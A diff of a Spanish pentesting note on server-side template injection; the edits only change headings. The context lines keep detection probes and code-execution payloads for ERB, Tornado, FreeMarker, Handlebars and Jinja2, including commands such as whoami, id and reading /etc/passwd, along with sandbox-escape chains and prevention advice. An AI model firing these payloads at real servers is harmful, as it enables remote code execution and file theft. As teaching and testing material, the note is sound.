@@ -1,16 +1,10 @@
----
-icon: folder-open
----
-
-# Server-side template injection (SSTI)
-
-## 💉 ¿Qué es SSTI?
+# 💉 SSTI
 
 **Server-Side Template Injection (SSTI)** ocurre cuando la entrada del usuario se inserta directamente en una plantilla antes de que sea procesada por el motor de templates.
 
 En lugar de tratar la entrada como texto, el motor la interpreta como código y la ejecuta.
 
-#### ✅ Uso normal (seguro)
+### ✅ Uso normal (seguro)
 
 ```python
 # El input del usuario se pasa como dato
@@ -19,7 +13,7 @@ render("Hello {{name}}", name=user_input)
 # user_input = "{{7*7}}" → resultado: "Hello {{7*7}}"
 ```
 
-#### ❌ Uso vulnerable
+### ❌ Uso vulnerable
 
 ```python
 # El input del usuario se inserta dentro del template
@@ -32,7 +26,7 @@ La diferencia clave es si el input se trata como **dato** o como **código**.
 
 ***
 
-### 🧩  Motores de templates y su sintaxis
+## 🧩  Motores de templates y su sintaxis
 
 Cada motor usa una sintaxis distinta:
 
@@ -40,9 +34,9 @@ Cada motor usa una sintaxis distinta:
 
 ***
 
-### 🔍 Detección e identificación
+## 🔍 Detección e identificación
 
-#### 1️⃣ Detectar SSTI
+### 1️⃣ Detectar SSTI
 
 Pruebas básicas:
 
@@ -53,7 +47,7 @@ ${7*7}     → 49
 #{7*7}     → 49
 ```
 
-#### 2️⃣ Identificar el motor
+### 2️⃣ Identificar el motor
 
 Ejemplo:
 
@@ -70,7 +64,7 @@ Resultados:
 * Error → revisar mensaje
 * Nada → probar otra sintaxis
 
-#### 3️⃣ Revisar errores
+### 3️⃣ Revisar errores
 
 Los errores suelen revelar el motor:
 
@@ -82,7 +76,7 @@ Los errores suelen revelar el motor:
 
 ***
 
-### 🎯 Puntos comunes de inyección
+## 🎯 Puntos comunes de inyección
 
 * Parámetros en URL (especialmente `message=` o errores)
 * Editores de templates (CMS, blogs)
@@ -93,9 +87,9 @@ Los errores suelen revelar el motor:
 
 ***
 
-### 💣 Explotación por motor
+## 💣 Explotación por motor
 
-#### 💎 ERB (Ruby)
+### ERB (Ruby)
 
 ```ruby
 <%= `whoami` %>
@@ -103,7 +97,7 @@ Los errores suelen revelar el motor:
 <%= File.read("/etc/passwd") %>
 ```
 
-#### 🐍 Tornado (Python)
+### Tornado (Python)
 
 ```python
 {% import os %}{{os.popen('id').read()}}
@@ -115,7 +109,7 @@ Inyección en contexto existente:
 user.name}}{% import os %}{{os.popen('id').read()}
 ```
 
-#### ☕ FreeMarker (Java)
+### FreeMarker (Java)
 
 ```java
 ${"freemarker.template.utility.Execute"?new()("id")}
@@ -129,7 +123,7 @@ Bypass de sandbox:
 ${ec.newInstance()("id")}
 ```
 
-#### 🟨 Handlebars (JavaScript)
+### Handlebars (JavaScript)
 
 Ejemplo de cadena compleja para RCE usando prototipos:
 
@@ -143,7 +137,7 @@ Ejemplo de cadena compleja para RCE usando prototipos:
 {{/with}}
 ```
 
-#### 🐍 Django (Python)
+### Django (Python)
 
 Django suele estar en sandbox:
 
@@ -157,17 +151,17 @@ No suele permitir RCE directo, pero sí fuga de información.
 
 ***
 
-### 🔓 Escape de sandbox
+## 🔓 Escape de sandbox
 
 Algunos motores limitan funciones peligrosas, pero se pueden evadir:
 
-#### 🎯 Traversal de clases (Java/Python)
+### Traversal de clases (Java/Python)
 
 * Acceder a jerarquías de clases
 * Llegar a funciones peligrosas (`Runtime.exec`, `ProcessBuilder`)
 * Usar reflexión
 
-#### 🎯 Bypass en Jinja2
+### Bypass en Jinja2
 
 ```python
 {{''.__class__.__mro__[2].__subclasses__()}}
@@ -181,7 +175,7 @@ Buscar `subprocess.Popen` y ejecutar:
 
 ***
 
-### 🧪 Exploits personalizados con código fuente
+## 🧪 Exploits personalizados con código fuente
 
 Si puedes leer código fuente:
 
@@ -200,14 +194,14 @@ Resultado: se elimina el archivo sensible.
 
 ***
 
-### 🛡️ Prevención y mitigación
+## 🛡️ Prevención y mitigación
 
-#### 🧱 Usar templates sin lógica
+### Usar templates sin lógica
 
 * Motores como Mustache limitan ejecución
 * Separar lógica y presentación
 
-#### 🧠 Tratar input como datos
+### Tratar input como datos
 
 ```javascript
 # Seguro
@@ -217,19 +211,19 @@ render_template("page.html", name=user_input)
 render_template_string("Hello " + user_input)
 ```
 
-#### 🔒 Usar sandbox
+### Usar sandbox
 
 * Activar restricciones del motor
 * Limitar clases y funciones accesibles
 * Deshabilitar funciones peligrosas
 
-#### 🧪 Validación de entrada
+### Validación de entrada
 
 * Bloquear caracteres de templates (`{{`, `${`, `<%`)
 * Usar listas blancas
 * Sanitizar antes de procesar
 
-#### 🔐 Principio de mínimo privilegio
+### Principio de mínimo privilegio
 
 * Ejecutar con permisos mínimos
 * No exponer objetos internos (`settings`, `config`)
@@ -237,7 +231,7 @@ render_template_string("Hello " + user_input)
 
 ***
 
-### 📚 Recursos útiles
+## 📚 Recursos útiles
 
 * [PayloadAllTheThings (SSTI)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) — colección de payloads
 * [HackTricks (SSTI)](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) — metodología y explotación
